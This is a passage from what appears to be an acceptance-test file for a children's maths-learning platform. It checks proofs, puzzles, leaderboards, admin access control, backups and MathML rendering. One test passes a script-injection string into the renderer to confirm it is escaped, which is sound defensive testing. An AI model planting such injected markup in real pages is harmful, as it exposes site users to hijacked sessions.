  },


  /* 4.1.10 + 3.2.5 + 3.3.4 — proof trainer */
  "proof-trainer": async () => {
    const { allProofs, publicProof, checkProof } = await import("../app/shared/proofs.mjs");
    const proofs = allProofs();
    assert(proofs.length >= 4, `only ${proofs.length} proofs authored`);

    /* Progression across grades, as the spec requires (3.3.4). */
    const grades = proofs.map(p => p.grade).sort((a, b) => a - b);
    assert(grades[0] <= 2, "no proof exercise for the early grades");
    assert(grades[grades.length - 1] >= 8, "no proof exercise at grade 8");
    const kinds = new Set(proofs.map(p => p.kind));
    assert(kinds.size >= 3, `only ${kinds.size} kinds of proof exercise`);

    /* The served form must not contain the answer. */
    for (const p of proofs) {
      const raw = JSON.stringify(publicProof(p));
      assert(!raw.includes('"reason":'), `${p.id} leaked its reasons`);
      assert(!raw.includes('"answer":'), `${p.id} leaked its answer`);
    }

    /* Marking: correct accepted, wrong rejected, with useful feedback. */
    for (const p of proofs) {
      let good, bad;
      if (p.kind === "order") {
        good = { order: p.steps.map((_, i) => String(i)) };
        bad = { order: p.steps.map((_, i) => String(i)).reverse() };
      } else if (p.kind === "reasons") {
        good = { reasons: Object.fromEntries(p.steps.map((s, i) => [String(i), s.reason])) };
        bad = { reasons: Object.fromEntries(p.steps.map((_, i) => [String(i), "Because it looks true"])) };
      } else {
        good = { blanks: Object.fromEntries(p.steps.map((s, i) => s.blank ? [String(i), s.answer] : null).filter(Boolean)) };
        bad = { blanks: Object.fromEntries(p.steps.map((s, i) => s.blank ? [String(i), s.answer === 0 ? 1 : 0] : null).filter(Boolean)) };
      }
      assert(checkProof(p, good).correct === true, `${p.id}: the correct proof was rejected`);
      assert(checkProof(p, bad).correct === false, `${p.id}: a wrong proof was accepted`);
      assert(checkProof(p, {}).correct === false, `${p.id}: an empty submission was accepted`);
      const fb = checkProof(p, bad);
      assert(fb.wrongSteps || fb.firstWrongPosition !== null,
        `${p.id}: rejection gave no indication of what was wrong`);
    }

    /* End to end through the API. */
    const c = client();
    await post(c, "/auth/register",
      { coppaConsent: true, email: "proof@b.com", password: "a-long-enough-pass", name: "P" });
    const kid = (await post(c, "/learners", { name: "Proof Kid" })).body.learner;

    const list = (await c("/proofs")).body;
    assert(list.proofs.length === proofs.length, "proof catalogue incomplete");

    const target = proofs.find(p => p.kind === "order");
    const started = await post(c, `/proofs/${target.id}/start`, { learnerId: kid.id });
    assert(started.status === 200, "proof session did not start");
    assert(started.body.proof.steps.length === target.steps.length, "served proof has the wrong step count");
    assert(started.body.proof.instruction, "no instruction given to the learner");

    /* A wrong order is refused and the session stays open for another go. */
    const wrongTry = await post(c, "/proofs/submit",
      { sessionId: started.body.sessionId, submission: { order: target.steps.map((_, i) => String(i)).reverse() } });
    assert(wrongTry.body.correct === false, "a reversed proof was accepted");
    assert(wrongTry.body.attempts === 1, "attempts not counted");

    const rightTry = await post(c, "/proofs/submit",
      { sessionId: started.body.sessionId, submission: { order: target.steps.map((_, i) => String(i)) } });
    assert(rightTry.body.correct === true, "the correct proof was rejected through the API");
    assert(rightTry.body.attempts === 2, "attempts not accumulated across tries");

    const completed = (await c(`/learners/${kid.id}/proofs`)).body.completed;
    assert(completed.some(x => x.proofId === target.id), "a completed proof was not recorded");

    /* Another account cannot drive or read this learner's proofs. */
    const bob = client();
    await post(bob, "/auth/register",
      { coppaConsent: true, email: "proofbob@b.com", password: "a-long-enough-pass", name: "B" });
    assert((await post(bob, `/proofs/${target.id}/start`, { learnerId: kid.id })).status === 403,
      "another account started a proof for this learner");
    assert((await bob(`/learners/${kid.id}/proofs`)).status === 403,
      "another account read this learner's proof history");

    return `${proofs.length} proofs across grades ${grades[0]}-${grades[grades.length - 1]}, ${kinds.size} kinds, structurally checked`;
  },


  /* 4.4.1 + 4.4.2 + 4.4.3 — admin portal, aggregate only */
  "admin-portal": async () => {
    const admin = client(), parent = client(), teacher = client();
    await post(admin, "/auth/register",
      { coppaConsent: true, email: "boss@b.com", password: "a-long-enough-pass", name: "Boss" });
    await post(parent, "/auth/register",
      { coppaConsent: true, email: "adm-p@b.com", password: "a-long-enough-pass", name: "P" });
    await post(teacher, "/auth/register",
      { coppaConsent: true, role: "teacher", email: "adm-t@b.com", password: "a-long-enough-pass", name: "T" });

    /* Admin is granted out of band, never self-assigned. */
    const sneaky = client();
    await post(sneaky, "/auth/register",
      { coppaConsent: true, role: "admin", email: "sneaky@b.com", password: "a-long-enough-pass", name: "S" });
    assert((await sneaky("/admin/overview")).status === 403,
      "an account granted itself the admin role at signup");

    /* Neither parents nor teachers reach admin data. */
    assert((await parent("/admin/overview")).status === 403, "a parent read admin data");
    assert((await teacher("/admin/overview")).status === 403, "a teacher read admin data");

    /* Give the platform something to aggregate. */
    const kid = (await post(parent, "/learners", { name: "Admin Kid" })).body.learner;
    await post(parent, "/runs",
      { learnerId: kid.id, topicId: "g6-ratios", tier: "practice", score: 4, total: 8 });

    const ov = await admin("/admin/overview");
    assert(ov.status === 200, `admin overview failed with ${ov.status}`);
    assert(ov.body.users >= 4, "user count is wrong");
    assert(ov.body.learners >= 1, "learner count is wrong");
    assert(ov.body.runs >= 1, "run count is wrong");
    assert(ov.body.attainment && typeof ov.body.attainment["50-69"] === "number",
      "no attainment distribution");
    assert(Array.isArray(ov.body.hardestTopics), "no hardest-topics analytics");
    assert(ov.body.byRole.some(r => r.role === "admin"), "role breakdown missing");

    /* Aggregate only: no child's name or individual answers in the payload. */
    const raw = JSON.stringify(ov.body);
    assert(!raw.includes("Admin Kid"), "admin overview exposed a learner's name");
    assert(!raw.includes("adm-p@b.com"), "admin overview exposed a parent's email");

    /* Retention policy is published, with real counts. */
    const ret = await admin("/admin/retention");
    assert(ret.status === 200 && ret.body.policy.erasure, "no retention policy published");
    assert(typeof ret.body.counts.auditEntries === "number", "no audit counts");

    /* Reading the audit log is itself audited. */
    const before = (await admin("/admin/audit")).body.entries.length;
    await admin("/admin/audit");
    const after = (await admin("/admin/audit")).body.entries;
    assert(after.length >= before, "audit log did not grow");
    assert(after.some(e => e.action === "admin.audit.read"), "admin audit access was not itself recorded");

    return "aggregate analytics, retention policy, audited access, RBAC enforced and admin not self-assignable";
  },


  /* 7.3 — partial credit on multi-step answers */
  "partial-credit": async () => {
    const c = client();
    const qs = (await c("/topics/g6-percent/practice/questions")).body.questions;

    /* Select-all: right picks earn credit, wrong picks cost it. */
    const mul = qs.find(q => q.type === "multi");
    assert(mul, "no multi-select question available");
    const probe = await post(c, "/answer", { questionId: mul.id, answer: [] });
    const correctIdx = probe.body.correctAnswer.split(", ").map(t => mul.opts.indexOf(t));
    assert(correctIdx.length >= 2, "need a multi question with at least two correct options");

    const full = await post(c, "/answer", { questionId: mul.id, answer: correctIdx });
    assert(full.body.correct === true && full.body.credit === 1, "a fully correct selection did not earn full credit");

    const partial = await post(c, "/answer", { questionId: mul.id, answer: correctIdx.slice(0, -1) });
    assert(partial.body.correct === false, "a partial selection was marked fully correct");
    assert(partial.body.credit > 0 && partial.body.credit < 1,
      `a partial selection earned credit ${partial.body.credit}, expected between 0 and 1`);
    assert(partial.body.creditDetail, "no explanation of the partial credit given");

    /* Guessing everything must NOT pay: wrong picks cancel right ones. */
    const all = mul.opts.map((_, i) => i);
    const shotgun = await post(c, "/answer", { questionId: mul.id, answer: all });
    assert(shotgun.body.credit < partial.body.credit,
      `selecting every option scored ${shotgun.body.credit}, no worse than a careful partial answer`);

    /* Ordering: credit for positions that are right. */
    const ord = qs.find(q => q.type === "order");
    assert(ord, "no ordering question available");
    const right = (await post(c, "/answer", { questionId: ord.id, answer: [] }))
      .body.correctAnswer.split("  →  ");
    const nearly = [...right];
    [nearly[0], nearly[1]] = [nearly[1], nearly[0]];        // one adjacent swap
    const near = await post(c, "/answer", { questionId: ord.id, answer: nearly });
    assert(near.body.correct === false, "a swapped order was marked correct");
    assert(near.body.credit > 0.4 && near.body.credit < 1,
      `one swap in an ordering scored ${near.body.credit}`);
    const reversed = await post(c, "/answer", { questionId: ord.id, answer: [...right].reverse() });
    assert(reversed.body.credit < near.body.credit,
      "a fully reversed order scored as well as a nearly-right one");

    /* Single-answer types stay all-or-nothing. */
    const num = qs.find(q => q.type === "in");
    const wrongNum = await post(c, "/answer", { questionId: num.id, answer: "-99999" });
    assert(wrongNum.body.credit === 0, "a wrong numeric answer earned partial credit");

    /* A session reports credit alongside the whole-question score. */
    await post(c, "/auth/register",
      { coppaConsent: true, email: "credit@b.com", password: "a-long-enough-pass", name: "C" });
    const kid = (await post(c, "/learners", { name: "Credit Kid" })).body.learner;
    const st = await post(c, "/practice/start", { learnerId: kid.id, topicId: "g6-percent" });
    let sum = null, guard = 0;
    while (guard++ < 20) {
      const step = await post(c, "/practice/answer",
        { sessionId: st.body.sessionId, answer: "-99999", hintsUsed: 0 });
      if (step.body.done) { sum = step.body.summary; break; }
    }
    assert(sum && typeof sum.creditPct === "number", "session summary omits partial credit");

    return "partial credit on ordering and select-all, guessing everything scores worse, single answers stay all-or-nothing";
  },


  /* 3.2.4 + 4.1.5 — puzzle area with hints but no solutions */
  "puzzles": async () => {
    const { PUZZLES, checkPuzzle, publicPuzzle } = await import("../app/shared/puzzles.mjs");
    assert(PUZZLES.length >= 6, `only ${PUZZLES.length} puzzles authored`);
    assert(new Set(PUZZLES.map(p => p.difficulty)).size >= 3, "puzzles span too few difficulties");

    /* Each puzzle accepts its own answer and rejects a near miss. */
    for (const p of PUZZLES) {
      assert(checkPuzzle(p, p.accepts[0]), `${p.id} rejects its own answer`);
      assert(!checkPuzzle(p, p.accepts[0] + 1), `${p.id} accepts a wrong answer`);
      assert(p.hints.length >= 2, `${p.id} has too few hints`);
      /* The real leak test is structural: the served object must carry
         neither the accepted answers nor the hint texts. Numeric fields like
         difficulty may legitimately coincide with an answer value. */
      const served = publicPuzzle(p);
      assert(!("accepts" in served), `${p.id} served its accepted answers`);
      assert(!("hints" in served), `${p.id} served all its hints at once`);
      assert(typeof served.hintCount === "number", `${p.id} does not say how many hints exist`);
      const values = Object.entries(served)
        .filter(([k]) => k !== "difficulty" && k !== "hintCount")
        .map(([, v]) => String(v)).join(" ");
      assert(!new RegExp(`\\b${p.accepts[0]}\\b`).test(values) || p.prompt.includes(String(p.accepts[0])),
        `${p.id} leaked its answer in the served text`);
    }

    const c = client();
    await post(c, "/auth/register",
      { coppaConsent: true, email: "puz@b.com", password: "a-long-enough-pass", name: "Z" });
    const kid = (await post(c, "/learners", { name: "Puzzle Kid" })).body.learner;

    const list = (await c("/puzzles")).body.puzzles;
    assert(list.length === PUZZLES.length, "puzzle list incomplete");
    assert(list.every(p => p.hintCount > 0 && !("accepts" in p)), "puzzle list exposes answers");

    const target = PUZZLES[1];

    /* A wrong answer must NOT reveal the solution — that is the whole point. */
    const wrong = await post(c, `/puzzles/${target.id}/answer`,
      { learnerId: kid.id, answer: "999999", hintsUsed: 0 });
    assert(wrong.body.correct === false, "a wrong puzzle answer was accepted");
    assert(!("correctAnswer" in wrong.body), "a wrong answer revealed the solution");
    assert(!JSON.stringify(wrong.body).includes(String(target.accepts[0])),
      "a wrong answer leaked the solution in its message");

    /* Hints come one at a time. */
    const h1 = await post(c, `/puzzles/${target.id}/hint`, { level: 1 });
    assert(h1.body.hint === target.hints[0], "wrong hint served");
    assert(h1.body.last === false, "the first of several hints was marked final");

    /* Solving with no hints earns a gold trophy and the elegant badge. */
    const solved = await post(c, `/puzzles/${target.id}/answer`,
      { learnerId: kid.id, answer: String(target.accepts[0]), hintsUsed: 0 });
    assert(solved.body.correct === true, "the correct puzzle answer was rejected");
    assert(solved.body.trophy === "gold", `unaided solve gave a ${solved.body.trophy} trophy`);
    assert(solved.body.firstSolve === true, "first solve not flagged");

    const rw = (await c(`/learners/${kid.id}/rewards`)).body;
    assert(rw.badges.some(b => b.code === "elegant_solution"), "no badge for an unaided solve");

    /* A hinted solve on another puzzle earns a lesser trophy. */
    const other = PUZZLES[2];
    const hinted = await post(c, `/puzzles/${other.id}/answer`,
      { learnerId: kid.id, answer: String(other.accepts[0]), hintsUsed: 2 });
    assert(hinted.body.trophy === "bronze", `a two-hint solve gave a ${hinted.body.trophy} trophy`);

    /* Re-solving does not award points twice. */
    const again = await post(c, `/puzzles/${target.id}/answer`,
      { learnerId: kid.id, answer: String(target.accepts[0]), hintsUsed: 0 });
    assert(again.body.firstSolve === false, "a repeat solve was counted as the first");

    const solvedList = (await c(`/learners/${kid.id}/puzzles`)).body;
    assert(solvedList.solved.length === 2, `expected 2 solved, got ${solvedList.solved.length}`);
    assert(solvedList.solved.every(s => s.title), "solved puzzles are not named");

    /* Another account cannot answer for this learner. */
    const bob = client();
    await post(bob, "/auth/register",
      { coppaConsent: true, email: "puzbob@b.com", password: "a-long-enough-pass", name: "B" });
    assert((await post(bob, `/puzzles/${target.id}/answer`,
      { learnerId: kid.id, answer: String(target.accepts[0]) })).status === 403,
      "another account solved a puzzle for this learner");

    return `${PUZZLES.length} puzzles, hints one at a time, wrong answers never reveal the solution, trophies reflect hint use`;
  },


  /* 10.1 — response times and payload sizes under concurrency.
     This measures the SERVER only. Real page-load time depends on the
     network and device, which cannot be established from here, so 10.1
     stays partial and says so. */
  "performance": async () => {
    const c = client();
    await post(c, "/auth/register",
      { coppaConsent: true, email: "perf@b.com", password: "a-long-enough-pass", name: "P" });
    const kid = (await post(c, "/learners", { name: "Perf Kid" })).body.learner;
    await post(c, "/runs",
      { learnerId: kid.id, topicId: "g6-ratios", tier: "practice", score: 6, total: 8 });

    const time = async (label, fn) => {
      const t0 = performance.now();
      const r = await fn();
      return { label, ms: performance.now() - t0, r };
    };

    /* Cold single-request latency on the endpoints a screen actually needs. */
    const singles = [];
    singles.push(await time("curriculum", () => c("/curriculum")));
    singles.push(await time("questions", () => c("/topics/g6-nscoord/practice/questions")));
    singles.push(await time("progress", () => c(`/learners/${kid.id}/progress`)));
    singles.push(await time("next", () => c(`/learners/${kid.id}/next`)));
    singles.push(await time("answer", () => post(c, "/answer", { questionId: "g6-ratios:0", answer: 0 })));

    for (const s of singles)
      assert(s.ms < 1000, `${s.label} took ${Math.round(s.ms)}ms, over the 1000ms budget`);

    /* The curriculum payload is the largest thing served; it must stay sane. */
    const curBytes = JSON.stringify((await c("/curriculum")).body).length;
    assert(curBytes < 600_000, `curriculum payload is ${Math.round(curBytes / 1024)}KB`);

    /* Concurrency: 40 simultaneous reads must all succeed and stay responsive.
       This is nowhere near the spec's 50,000 concurrent users — that needs a
       load-testing rig and horizontal scaling, and 13.10 stays open. */
    const t0 = performance.now();
    const results = await Promise.all(
      Array.from({ length: 40 }, () => c("/topics/g6-nscoord/practice/questions")));
    const wall = performance.now() - t0;
    assert(results.every(r => r.status === 200), "a request failed under concurrent load");
    assert(wall < 5000, `40 concurrent reads took ${Math.round(wall)}ms`);

    /* Writes under concurrency must not corrupt the progress row. */
    await Promise.all(Array.from({ length: 10 }, () =>
      post(c, "/runs", { learnerId: kid.id, topicId: "g6-percent", tier: "practice", score: 5, total: 6 })));
    const prog = (await c(`/learners/${kid.id}/progress`)).body.progress
      .find(p => p.topic_id === "g6-percent" && p.tier === "practice");
    assert(prog, "concurrent writes lost the progress row");
    assert(prog.runs === 10, `expected 10 runs recorded, got ${prog.runs}`);
    assert(prog.best_pct === 83, `best percentage corrupted to ${prog.best_pct}`);

    const slowest = singles.sort((a, b) => b.ms - a.ms)[0];
    return `slowest endpoint ${slowest.label} at ${Math.round(slowest.ms)}ms, ` +
           `curriculum ${Math.round(curBytes / 1024)}KB, 40 concurrent reads in ${Math.round(wall)}ms, ` +
           `10 concurrent writes all recorded`;
  },


  /* 11.1 + 10.6 — installable PWA with an offline shell */
  "pwa-offline": async () => {
    const { readFileSync, existsSync } = await import("node:fs");
    const { execSync } = await import("node:child_process");

    /* Manifest. */
    assert(existsSync("app/web/public/manifest.webmanifest"), "no web app manifest");
    const man = JSON.parse(readFileSync("app/web/public/manifest.webmanifest", "utf8"));
    for (const k of ["name", "short_name", "start_url", "display", "icons"])
      assert(man[k], `manifest is missing ${k}`);
    assert(man.display === "standalone", "manifest does not request standalone display");
    assert(man.icons.length && man.icons[0].src, "manifest has no icon");
    assert(existsSync("app/web/public" + man.icons[0].src), "manifest icon file does not exist");

    /* The document must reference the manifest and a theme colour. */
    const html = readFileSync("app/web/index.html", "utf8");
    assert(/rel="manifest"/.test(html), "index.html does not link the manifest");
    assert(/name="theme-color"/.test(html), "no theme colour declared");
    assert(/<html lang="en">/.test(html), "document has no language");

    /* Service worker: shell cached, API never cached. That second rule is the
       important one — a cached answer could be replayed against the grader,
       and stale progress would be worse than an honest offline message. */
    const sw = readFileSync("app/web/public/sw.js", "utf8");
    assert(/addEventListener\("install"/.test(sw), "service worker has no install handler");
    assert(/addEventListener\("fetch"/.test(sw), "service worker has no fetch handler");
    assert(/pathname\.startsWith\("\/api\/"\)/.test(sw), "service worker does not exclude the API");
    assert(/method !== "GET"/.test(sw), "service worker does not exclude writes");
    assert(/caches\.delete/.test(sw), "service worker never cleans up old caches");

    /* It must be registered, and only in production builds. */
    const main = readFileSync("app/web/src/main.tsx", "utf8");
    assert(/serviceWorker.*register/s.test(main), "service worker is never registered");
    assert(/import\.meta\.env\.PROD/.test(main), "service worker would register during development");

    /* And the app must actually build, with the shell files emitted. */
    execSync("./node_modules/.bin/vite build", { cwd: "app/web", stdio: "pipe" });
    for (const f of ["dist/index.html", "dist/manifest.webmanifest", "dist/sw.js", "dist/icon.svg"])
      assert(existsSync("app/web/" + f), `production build did not emit ${f}`);

    const built = readFileSync("app/web/dist/index.html", "utf8");
    assert(/rel="manifest"/.test(built), "built page lost the manifest link");

    return "installable manifest, offline shell, API excluded from cache, production build emits all shell files";
  },


  /* 5.10 — achievement titles earned by advanced mastery */
  "achievement-titles": async () => {
    const rewards = await import("../app/server/src/rewards.js");
    assert(rewards.TITLES.length >= 4, "too few achievement titles");
    for (const t of rewards.TITLES) {
      assert(t.name && t.code, "a title is missing a name or code");
      assert(Array.isArray(t.needs) && t.needs.length, `${t.code} has no requirements`);
      for (const n of t.needs)
        assert(rewards.BADGES[n], `title ${t.code} requires unknown badge "${n}"`);
    }
    /* Titles must be ordered strongest first, so the displayed one is the best. */
    const idx = c => rewards.TITLES.findIndex(t => t.code === c);
    assert(idx("grand_combinatorialist") < idx("apprentice"),
      "titles are not ordered with the hardest first");

    const c = client();
    await post(c, "/auth/register",
      { coppaConsent: true, email: "title@b.com", password: "a-long-enough-pass", name: "T" });
    const kid = (await post(c, "/learners", { name: "Title Kid" })).body.learner;

    /* Nothing earned yet. */
    let r = (await c(`/learners/${kid.id}/rewards`)).body;
    assert(r.title && r.title.current === null, "a learner started with a title");
    assert(r.title.locked.length === rewards.TITLES.length, "locked titles not listed");

    /* A first round earns the entry title, not a prestigious one. */
    await post(c, "/runs",
      { learnerId: kid.id, topicId: "g6-ratios", tier: "practice", score: 8, total: 8 });
    r = (await c(`/learners/${kid.id}/rewards`)).body;
    assert(r.title.current, "no title after earning the first badge");
    assert(r.title.current.code === "apprentice",
      `a single perfect round awarded "${r.title.current.code}"`);

    /* A title requiring badges the learner does not hold stays locked. */
    assert(r.title.locked.some(t => t.code === "grand_combinatorialist"),
      "an unearned advanced title is not locked");

    return `${rewards.TITLES.length} titles, requirements validated against real badges, strongest shown first`;
  },


  /* 4.1.8 + 5.8 — leaderboards: off by default, teacher-controlled, no global board */
  "leaderboards": async () => {
    const teacher = client(), alice = client(), bob = client(), outsider = client();
    await post(teacher, "/auth/register",
      { coppaConsent: true, role: "teacher", email: "lb-t@b.com", password: "a-long-enough-pass", name: "T" });
    await post(alice, "/auth/register",
      { coppaConsent: true, email: "lb-a@b.com", password: "a-long-enough-pass", name: "A" });
    await post(bob, "/auth/register",
      { coppaConsent: true, email: "lb-b@b.com", password: "a-long-enough-pass", name: "B" });
    await post(outsider, "/auth/register",
      { coppaConsent: true, email: "lb-o@b.com", password: "a-long-enough-pass", name: "O" });

    const cls = (await post(teacher, "/classes", { name: "Leaderboard Class" })).body.class;
    const aKid = (await post(alice, "/learners", { name: "Ada" })).body.learner;
    const bKid = (await post(bob, "/learners", { name: "Ben" })).body.learner;
    await post(alice, "/classes/join", { joinCode: cls.joinCode, learnerId: aKid.id });
    await post(bob, "/classes/join", { joinCode: cls.joinCode, learnerId: bKid.id });

    /* Ada does more work than Ben. */
    for (let i = 0; i < 3; i++)
      await post(alice, "/runs", { learnerId: aKid.id, topicId: "g6-ratios", tier: "practice", score: 8, total: 8 });
    await post(bob, "/runs", { learnerId: bKid.id, topicId: "g6-ratios", tier: "practice", score: 4, total: 8 });

    /* OFF by default — a child is never ranked without an adult deciding. */
    let lb = await alice(`/classes/${cls.id}/leaderboard`);
    assert(lb.status === 200 && lb.body.enabled === false,
      "the leaderboard was on before any teacher enabled it");
    assert(lb.body.reason, "no explanation given when the leaderboard is off");

    /* A parent cannot switch it on. */
    assert((await alice(`/classes/${cls.id}/settings`,
      { method: "PUT", body: JSON.stringify({ leaderboardOn: true }) })).status === 403,
      "a parent enabled the class leaderboard");

    /* The teacher enables it, anonymised. */
    await teacher(`/classes/${cls.id}/settings`,
      { method: "PUT", body: JSON.stringify({ leaderboardOn: true, displayNames: false }) });

    lb = (await alice(`/classes/${cls.id}/leaderboard`)).body;
    assert(lb.enabled === true, "the leaderboard did not turn on");
    assert(lb.board.length === 2, `expected 2 learners, got ${lb.board.length}`);
    assert(lb.board[0].points > lb.board[1].points, "the board is not ordered by points");
    assert(lb.board[0].name === "Ada", "a parent cannot see their own child on the board");
    /* The other family's child must NOT be named while anonymised. */
    const otherRow = lb.board.find(r => !r.you);
    assert(otherRow.name !== "Ben", "another family's child was named on an anonymised board");
    assert(/^Learner \d+$/.test(otherRow.name), `anonymised label was "${otherRow.name}"`);

    /* With names allowed, classmates are named. */
    await teacher(`/classes/${cls.id}/settings`,
      { method: "PUT", body: JSON.stringify({ leaderboardOn: true, displayNames: true }) });
    lb = (await alice(`/classes/${cls.id}/leaderboard`)).body;
    assert(lb.board.some(r => r.name === "Ben"), "names were allowed but classmates stayed anonymous");

    /* Someone with no child in the class sees nothing at all. */
    assert((await outsider(`/classes/${cls.id}/leaderboard`)).status === 403,
      "an unrelated account read a class leaderboard");

    /* There is no global leaderboard endpoint to leak across classes. */
    const global = await alice("/leaderboard");
    assert(global.status === 404, "a global leaderboard endpoint exists");

    return "off by default, teacher-controlled, anonymised by default, class-scoped with no global board";
  },


  /* 10.4 — backups, restore, and a readiness probe that means something */
  "reliability": async () => {
    const { existsSync, rmSync, mkdirSync, writeFileSync, utimesSync } = await import("node:fs");
    const { DatabaseSync } = await import("node:sqlite");

    /* /health is liveness; /ready must actually consult the database. */
    const health = await (await fetch(`${BASE}/health`)).json();
    assert(health.ok === true, "health endpoint is not ok");
    const ready = await fetch(`${BASE}/ready`);
    assert(ready.status === 200, `readiness probe returned ${ready.status}`);
    const rBody = await ready.json();
    assert(rBody.ok === true && typeof rBody.users === "number",
      "readiness probe does not report on the database");

    /* Take a backup through the admin endpoint. */
    /* The admin account may already exist from another check, so register
       then fall back to signing in rather than assuming a clean slate. */
    const admin = client();
    const reg = await post(admin, "/auth/register",
      { coppaConsent: true, email: "boss@b.com", password: "a-long-enough-pass", name: "Boss" });
    if (reg.status !== 200)
      await post(admin, "/auth/login", { email: "boss@b.com", password: "a-long-enough-pass" });
    const overview = await admin("/admin/overview");
    assert(overview.status === 200, `admin sign-in failed: ${JSON.stringify(overview.body)}`);
    const before = overview.body.users;

    const b = await post(admin, "/admin/backup", {});
    assert(b.status === 200 && b.body.ok, `backup failed: ${JSON.stringify(b.body)}`);
    assert(existsSync(b.body.file), "backup file was not written");

    /* The snapshot must be a usable database with the same data, not an
       empty file — a backup nobody can restore is not a backup. */
    const snap = new DatabaseSync(b.body.file);
    const restored = snap.prepare("SELECT COUNT(*) c FROM users").get().c;
    assert(restored === before, `backup holds ${restored} users, live database has ${before}`);
    const integrity = snap.prepare("PRAGMA integrity_check").get();
    assert(String(Object.values(integrity)[0]).toLowerCase() === "ok",
      "the backup fails its own integrity check");
    snap.close();

    /* Pruning keeps the disk from filling. */
    const { prune } = await import("../app/server/src/backup.js");
    const dir = "app/server/data/prune-test";
    rmSync(dir, { recursive: true, force: true });
    mkdirSync(dir, { recursive: true });
    for (let i = 0; i < 10; i++) {
      const f = `${dir}/old-${i}.db`;
      writeFileSync(f, "x");
      const t = new Date(2020, 0, i + 1);
      utimesSync(f, t, t);
    }
    const removed = prune(dir, 3);
    assert(removed.length === 7, `pruning to 3 removed ${removed.length} of 10`);
    const { readdirSync } = await import("node:fs");
    assert(readdirSync(dir).length === 3, "pruning left the wrong number of backups");
    rmSync(dir, { recursive: true, force: true });

    /* Graceful degradation: an unknown route returns JSON-ish failure, not a crash. */
    const missing = await fetch(`${BASE}/api/definitely-not-a-route`);
    assert(missing.status === 404, `unknown route returned ${missing.status}`);

    return "liveness and readiness separated, backup restorable and integrity-checked, pruning bounded";
  },


  /* 3.5.4 — maths notation as MathML with spoken equivalents */
  "math-notation": async () => {
    const { toMathML, renderQuestion } = await import("../app/shared/mathml.mjs");

    const cases = [
      ["7 × 8", "7 times 8", "<mo>&#xD7;</mo>"],
      ["12 ÷ 3", "12 divided by 3", "<mo>&#xF7;</mo>"],
      ["3/4", "3 over 4", "<mfrac>"],
      ["|-7|", "the absolute value of -7", "<mo>|</mo>"],
      ["(3, -2)", "the point 3 comma -2", "<mo>,</mo>"],
      ["4 : 6", "4 to 6", "<mo>:</mo>"],
      ["2^5", "2 to the power of 5", "<msup>"]
    ];
    for (const [input, spoken, tag] of cases) {
      const r = toMathML(input);
      assert(r, `"${input}" produced no MathML`);
      assert(r.spoken === spoken, `"${input}" speaks as "${r.spoken}", expected "${spoken}"`);
      assert(r.mathml.includes(tag), `"${input}" is missing ${tag}`);
      assert(r.mathml.includes('xmlns="http://www.w3.org/1998/Math/MathML"'),
        `"${input}" has no MathML namespace`);
      assert(r.mathml.includes('aria-label='), `"${input}" has no accessible label`);
      /* Negative numbers must use a minus sign, not a hyphen. */
      if (input.includes("-")) assert(r.mathml.includes("&#x2212;"),
        `"${input}" rendered a hyphen instead of a minus sign`);
    }

    /* Unrecognised text must NOT be wrapped in markup that lies about it. */
    assert(toMathML("what is the capital of France") === null,
      "prose was rendered as mathematics");
    assert(toMathML("") === null, "empty input produced MathML");

    /* Inside a sentence, only the maths is marked up and prose is escaped. */
    const q = renderQuestion("What is 7 × 8, and where is (3, -2)?");
    assert(q.mathCount === 2, `found ${q.mathCount} expressions, expected 2`);
    assert(q.html.includes("What is "), "prose was lost");
    assert((q.html.match(/<math /g) || []).length === 2, "wrong number of math elements");

    /* Prose around the maths must be escaped, or a question containing an
       angle bracket would emit raw markup. */
    const risky = renderQuestion("Is 5 < 6 and 7 × 8 true?");
    assert(risky.html.includes("5 &lt; 6"), "a less-than in prose was not escaped");
    assert(risky.mathCount === 1, "the maths in a mixed sentence was not found");
    const injected = renderQuestion("Careful <script>alert(1)</script> and 3/4");
    assert(!injected.html.includes("<script"), "script markup survived rendering");
    assert(injected.html.includes("<mfrac>"), "the fraction was lost while escaping");

    /* Every MathML fragment must be balanced, or a reader will mis-announce it. */
    for (const [input] of cases) {
      const ml = toMathML(input).mathml;
      const open = (ml.match(/<[a-z]+[ >]/g) || []).length;
      const close = (ml.match(/<\/[a-z]+>/g) || []).length;
      assert(open === close, `"${input}" produced unbalanced MathML`);
    }

    return `${cases.length} notations rendered as MathML with spoken labels, prose left alone`;
  },


  /* 8.5 — content quality tooling that demonstrably catches problems */
  "content-lint": async () => {
    const { execSync } = await import("node:child_process");
    const { lintQuestion } = await import("../tools/lint-content.mjs");

    /* Every rule must fire on content that breaks it. A linter nobody has
       seen catch anything is not evidence that the content is sound. */
    const fires = (q, where, grade, needle) => {
      const r = lintQuestion(q, where || "t#1", grade || null, new Map());
      const all = [...r.errors, ...r.warnings].join(" | ");
      assert(all.includes(needle), `rule for "${needle}" did not fire; got: ${all || "(nothing)"}`);
    };

    fires({ type: "in", q: "What is 2 + 2?", ans: 4 }, "t#1", null, "no explanation");
    fires({ type: "in", q: "hi", ans: 1, expl: "x", sec: "N" }, "t#1", null, "too short");
    fires({ type: "mc", q: "Pick the right one here", opts: ["a", "a"], a: 0, expl: "x", sec: "N" },
      "t#1", null, "duplicate options");
    fires({ type: "mc", q: "Pick the right one here", opts: ["a"], a: 0, expl: "x", sec: "N" },
      "t#1", null, "fewer than two options");
    fires({ type: "mc", q: "Pick the right one here", opts: ["a", "b"], a: 9, expl: "x", sec: "N" },
      "t#1", null, "answer index");
    fires({ type: "multi", q: "Select every correct one", opts: ["a", "b"], aMulti: [0, 1], expl: "x", sec: "N" },
      "t#1", null, "every option marked correct");
    fires({ type: "order", q: "Put these in order please", items: ["a", "b", "c"], ansOrder: ["a", "b", "z"], expl: "x", sec: "N" },
      "t#1", null, "permutation");
    fires({ type: "order", q: "Put these in order please", items: ["a", "b"], ansOrder: ["a", "b"], expl: "x", sec: "N" },
      "t#1", null, "too few items");
    fires({ type: "in", q: "What is 2 + 2?", ans: 4, expl: "What is 2 + 2?", sec: "N" },
      "t#1", null, "repeats the question");
    fires({ type: "in", q: "What is 2 + 2?", ans: 4, sec: "N", expl: "Add them", hint: "Add them" },
      "t#1", null, "hint is identical");
    fires({ type: "in", q: "What is 2 + 2?", ans: 4, expl: "x", sec: "ZZZ" }, "t#1", null, "unknown section");
    fires({ type: "in", ans: 4, expl: "x", sec: "N",
            q: "Considering the aforementioned circumstances and notwithstanding any subsequent " +
               "developments, determine conclusively the aggregate quantity resulting therefrom" },
      "t#1", "K", "grade K");

    /* Duplicate detection across a bank. */
    const seen = new Map();
